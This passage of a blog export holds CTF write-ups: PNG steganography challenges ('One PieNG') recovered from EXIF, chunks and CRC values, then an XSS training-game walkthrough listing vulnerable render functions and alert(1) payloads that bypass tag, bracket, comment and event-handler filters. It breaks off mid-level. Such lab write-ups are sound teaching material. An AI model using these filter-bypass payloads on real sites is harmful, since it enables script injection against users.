<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#An0th3r_key_1n_3xif#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-12"><a href="#One-PieNG-12" class="headerlink" title="One PieNG 12"></a>One PieNG 12</h2><p>æŸ¥çœ‹å›¾ç‰‡çš„exif   <a href="https://exif.tuchong.com/">åœ¨çº¿ç½‘ç«™</a></p>
<table>
<thead>
<tr>
<th>XMP-photoshop</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>DocumentAncestors</td>
<td>23415F6B65795F6672306D5F50683074307368307023</td>
</tr>
<tr>
<td>åŸå¸‚</td>
<td>b58/3AjtPrXQJuhFwguK7nqu4ZpsqMLwU</td>
</tr>
</tbody></table>
<p>ç¬¬ä¸€è¡Œ<a href="http://stool.chinaz.com/hex">hexè§£ç </a>å³å¯å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#A_key_fr0m_Ph0t0sh0p#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-13"><a href="#One-PieNG-13" class="headerlink" title="One PieNG 13"></a>One PieNG 13</h2><p>ç”¨010æ‰“å¼€</p>
<p><img src="https://img.vim-cn.com/8e/a91937838691be035bea2119d91ebbfab7782b.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#Ju5t_a_1one1y_tEXt_chunk#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-14"><a href="#One-PieNG-14" class="headerlink" title="One PieNG 14"></a>One PieNG 14</h2><p>ç”¨<a href="https://github.com/rvong/png-debugger">PNGDebugger</a>è·‘äº†ä¸€ä¸‹ï¼Œå‘ç°å‰ä¹ä¸ªIDATå—é”™è¯¯ï¼Œç”¨<a href="http://t0mrvvi1b3t.top/2021/05/03/%E5%B7%A5%E5%85%B7/">tweakpng</a>åˆ é™¤æ‰å‰ä¹ä¸ªIDATå—å³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#eXtr4_IDAT_of_an0th3r_Pn9#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-15"><a href="#One-PieNG-15" class="headerlink" title="One PieNG 15"></a>One PieNG 15</h2><p>æ‰”kaliä¸­ binwalkå‘½ä»¤æ¥åˆ†ç¦»</p>
<p>è€ƒç‚¹ zlibå‹ç¼©æ•°æ® ï¼ˆ<a href="https://blog.csdn.net/qq_40574571/article/details/80164981">æœ‰å…³çŸ¥è¯†</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#IDAT_i5_a_z1ib_p4cka9e#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-16"><a href="#One-PieNG-16" class="headerlink" title="One PieNG 16"></a>One PieNG 16</h2><p>è¿™ä¸ªçœŸçš„ï¼Œå¥½é˜´é—´å“Ÿï¼Œæˆ‘äººéº»äº†â€¦..</p>
<p>pngdebuggeråˆ†æå›¾ç‰‡ï¼Œå‰ä¹ä¸ªå‡ºé”™çš„IDATå—çš„crc-codeåŠ èµ·æ¥å°±æ˜¯flagâ€¦â€¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0000028D      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x00000291      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x00010295      crc-code&#x3D;0x00234831</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0x94F55588         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x00010299      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x0001029D      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000202A1      crc-code&#x3D;0x0064655F</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0xBA2406E1         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000202A5      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x000202A9      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000302AD      crc-code&#x3D;0x00683378</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0xCD6A57C7         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000302B1      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x000302B5      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000402B9      crc-code&#x3D;0x00643437</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0x9EC196CD         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000402BD      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x000402C1      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000502C5      crc-code&#x3D;0x00615F31</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0x1D1C51CC         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000502C9      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x000502CD      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000602D1      crc-code&#x3D;0x006E5F63</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0xD41FCAD9         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000602D5      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x000602D9      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000702DD      crc-code&#x3D;0x0068756E</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0x655D563D         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000702E1      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x000702E5      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000802E9      crc-code&#x3D;0x006B5F43</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0xCB1875FD         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000802ED      chunk-length&#x3D;0x00002646 (9798)</span><br><span class="line">0x000802F1      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x0008293B      crc-code&#x3D;0x00524323</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0x19FE70D3         &#x3D;&gt;      CRC FAILED</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">23483164655F683378643437615F316E5F6368756E6B5F43524323</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;hexè§£ç å</span><br><span class="line"></span><br><span class="line">#H1de_h3xd47a_1n_chunk_CRC#</span><br><span class="line"></span><br><span class="line">flagï¼š</span><br><span class="line">ctfshow&#123;#H1de_h3xd47a_1n_chunk_CRC#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-17"><a href="#One-PieNG-17" class="headerlink" title="One PieNG 17"></a>One PieNG 17</h2><p>010æ‰“å¼€ï¼Œå›¾ç‰‡çš„å°¾éƒ¨</p>
<p><img src="https://img.vim-cn.com/93/0ee9e002071fbec36c244b259fa81ec5b0f555.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#HexEditor_wi11_b3_he1pfu1#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-18"><a href="#One-PieNG-18" class="headerlink" title="One PieNG 18"></a>One PieNG 18</h2><p>ç”¨foremoståˆ†ç¦»å‡ºæ¥çš„ä¸œè¥¿ä¸­æœ‰ä¸ªå›¾ç‰‡</p>
<p><img src="https://img.vim-cn.com/52/5bd582f0dffcb261dc5baa853886296389ac52.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#He110_I_4m_Tw0_PieNG#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é—®å·"><a href="#é—®å·" class="headerlink" title="é—®å·"></a>é—®å·</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;å¥—å¨ƒç»ˆæœ‰æŠ¥ï¼Œå¤©é“å¥½è½®å›ã€‚ä¸ä¿¡æŠ¬å¤´çœ‹ï¼Œè‹å¤©é¥¶è¿‡è°ã€‚&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>pngéšå†™</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-haizi-meé€šå…³è®°å½•</title>
    <url>/2021/04/29/xss-haizi-me/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p><strong>server code:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/div&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p><strong>server code:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/textarea&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€å…³æ’å…¥çš„åœ°æ–¹åœ¨htmlæ ‡ç­¾é‡Œé¢ï¼Œæ‰€ä»¥è¦å…ˆé—­åˆ<code>&lt;textarea&gt;</code>æ ‡ç­¾<br><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>inputçš„åœ°æ–¹åœ¨å°–æ‹¬å·å†…éƒ¨ï¼Œéœ€è¦å…ˆé—­åˆå°–æ‹¬å·<br><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>



<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€å…³ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤äº†æ‹¬å·ï¼ˆæ›¿æ¢ä¸ºç©ºï¼‰ï¼Œè¿™é‡Œæœ‰ä¸ªå°tipï¼Œå¯ä»¥ç”¨åå¼•å·ä»£æ›¿åœ†æ‹¬å·ã€‚</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img.vim-cn.com/c3/1ff93a7abd8403678cc1e62c85f435c1c0aa06.png" alt="p1"></p>
<p><img src="https://img.vim-cn.com/b9/4133905d8213afd6571cb03e31c0b7b5248470.png" alt="p2"></p>
<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†åœ†æ‹¬å·å’Œåå¼•å·ï¼Œæ‰€ä»¥ä¸Šä¸€å…³çš„æ–¹æ³•å°±ä¸èƒ½ç”¨äº†ã€‚</p>
<p>å¯ä»¥ç”¨å„ç§ç¼–ç è¿›è¡Œç»•è¿‡ï¼Œå¦‚urlç¼–ç ã€unicodeç¼–ç â€¦</p>
<ul>
<li><code>&lt;svg&gt;</code>æ ‡ç­¾ä¸­å¯ä»¥ç›´æ¥æ‰§è¡Œå®ä½“å­—ç¬¦,payload2</li>
<li><img src="https://img.vim-cn.com/e4/9ee88d85f2dceafa213411c54c521fb389a413.png" alt="p3"></li>
<li>h5ä¸­<code>iframe</code>æ ‡ç­¾ï¼ˆiframe å…ƒç´ ä¼šåˆ›å»ºåŒ…å«å¦å¤–ä¸€ä¸ªæ–‡æ¡£çš„å†…è”æ¡†æ¶ï¼‰çš„<code>srcdoc</code>å±æ€§ï¼Œ<code>srcdoc</code>é‡Œçš„ä»£ç ä¼šä½œä¸º<code>iframe</code>ä¸­çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥ï¼Œ<code>srcdoc</code>ä¸­å¯ä»¥ç›´æ¥å»å†™è½¬è¯‘åçš„htmlç‰‡æ®µ</li>
<li><img src="https://img.vim-cn.com/cc/661c5e22230e03c7067474a2d604098caa1753.png" alt="p4"></li>
<li><img src="https://img.vim-cn.com/ab/89644e07ed2733aa03748fbf35708ad771c071.png" alt="p5"></li>
</ul>
<p><strong>input code &amp; html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">&quot;javascript:alert%281%29&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script&gt;alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span>&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">&#x27;ğŸ˜‚&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;!-- &#x27;</span> + input + <span class="string">&#x27; --&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€å…³å°†htmlä¸­çš„æ³¨é‡Šç¬¦<code>--&gt;</code>æ›¿æ¢æˆäº†ä¸€ä¸ªè¡¨æƒ…ï¼Œå¹¶ä¸”è¾“å…¥çš„å†…å®¹æ˜¯åŒ…å«åœ¨ä¸€æ®µæ³¨é‡Šç¬¦é‡Œçš„ã€‚</p>
<p>htmlé€šå¸¸çš„çš„æ³¨é‡Šç¬¦ä¸ºï¼š<code>&lt;!-- --&gt;</code>ï¼Œæµ‹è¯•å‘ç°<code>&lt;!- -!&gt;</code>ã€<code>&lt;!-- --!&gt;</code>åŒæ ·å¯ä»¥è¿›è¡Œæ³¨é‡Šï¼Œè¿™é‡Œå¯åˆ©ç”¨<code>--!&gt;</code>æ¥é—­åˆã€‚</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">--!&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- --!&gt;&lt;script&gt;alert(1)&lt;/script&gt; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;!-- --!&gt;&lt;img src=# onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; --&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†ä»¥<code>auto</code>ã€<code>on</code>å¼€å¤´ï¼Œ<code>=</code>ç»“å°¾çš„æ ‡ç­¾å±æ€§ï¼Œå¹¶ç”¨ä¸‹åˆ’çº¿<code>_</code>è¿›è¡Œæ›¿æ¢ï¼ŒåŒæ—¶å¿½ç•¥å¤§å°å†™ã€‚</p>
<p>å¯ä»¥ç”¨æ¢è¡Œä½¿onxxxä¸å’Œ=è¿æ¥ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…è¢«è¿‡æ»¤ã€‚<a href="https://m.runoob.com/jsref/dom-obj-event.html">HTML DOM äº‹ä»¶</a></p>
<table>
<thead>
<tr>
<th align="center">å±æ€§</th>
<th align="center">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="center">onclick</td>
<td align="center">å½“ç”¨æˆ·ç‚¹å‡»æŸä¸ªå¯¹è±¡æ—¶è°ƒç”¨çš„äº‹ä»¶å¥æŸ„</td>
</tr>
<tr>
<td align="center">onfocus</td>
<td align="center">å…ƒç´ è·å–ç„¦ç‚¹æ—¶è§¦å‘</td>
</tr>
<tr>
<td align="center">onmouseover</td>
<td align="center">é¼ æ ‡ç§»åˆ°æŸå…ƒç´ ä¹‹ä¸Š</td>
</tr>
</tbody></table>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">onfocus</span><br><span class="line">=alert(1)  éœ€è¦é¼ æ ‡ç‚¹å‡»æ¡†</span><br><span class="line"></span><br><span class="line">onclick</span><br><span class="line">=alert(1)  éœ€è¦é¼ æ ‡ç‚¹å‡»æ¡†</span><br><span class="line"></span><br><span class="line">onmouseover</span><br><span class="line">=alert(1)  éœ€è¦é¼ æ ‡æ”¾åœ¨æ¡†ä¸Š</span><br><span class="line"></span><br><span class="line">type=image src=# onerror</span><br><span class="line">=alert(1)  ç›´æ¥å¼¹</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">onmouseover</span></span></span><br><span class="line"><span class="tag">=<span class="string">alert(1)</span></span></span><br><span class="line"><span class="tag"> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">æˆ–</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span></span></span><br><span class="line"><span class="tag">=<span class="string">alert(1)</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­£åˆ™åŒ¹é…äº†ä»¥<code>&lt;</code>æˆ–<code>&lt;/</code>å¼€å¤´ï¼Œ<code>&gt;</code>æˆ–<code>/&gt;</code>ç»“å°¾çš„æ ‡ç­¾ï¼Œå¹¶æ›¿æ¢ä¸ºç©ºã€‚<br>å»æ‰æœ€åé¢çš„<code>&gt;</code>åˆ©ç”¨æµè§ˆå™¨å®¹é”™æ€§è¿è¡Œ</p>
<p><strong>input code:</strong>(ç¬¬ä¸€ä¸ªæœ€åè¿˜æœ‰ä¸ªç©ºæ ¼æˆ–å›è½¦ç”¨æ¥ä¸­æ–­å±æ€§å€¼)</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> </span></span><br><span class="line"><span class="tag"></span></span><br><span class="line">&lt;img src=# onerror=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;article&gt;&lt;img src=&quot;x&quot; onerror=alert(1) &lt;/article&gt;</span><br><span class="line">    </span><br><span class="line">&lt;article&gt;&lt;img src=# onerror=&quot;alert(1)&quot;&lt;/article&gt;</span><br></pre></td></tr></table></figure>



<h1 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">&#x27;/* \u574F\u4EBA */&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†<code>&lt;/style&gt;</code>æ ‡ç­¾ï¼Œå¿½ç•¥å¤§å°å†™ã€‚</p>
<p>å› ä¸ºæˆ‘ä»¬éœ€è¦ç”¨åˆ°<code>&lt;/style&gt;</code>æ¥é—­åˆæ ‡ç­¾ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ç©ºæ ¼è¿›è¡Œç»•è¿‡ã€‚</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;/style &gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="xml">      &lt;/style &gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;input&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¦æ±‚è¾“å…¥çš„å€¼è¦ä»¥<code>https://www.segmentfault.com</code>å¼€å¤´ï¼Œå¦åˆ™è¿”å›<code>Invalid URL</code>ä½†æ˜¯å¹¶æ²¡æœ‰é™åˆ¶ç»“å°¾ï¼Œæ‰€ä»¥é—­åˆæ‰<code>&lt;script&gt;</code>æ ‡ç­¾</p>
<p><strong>input code:</strong></p>
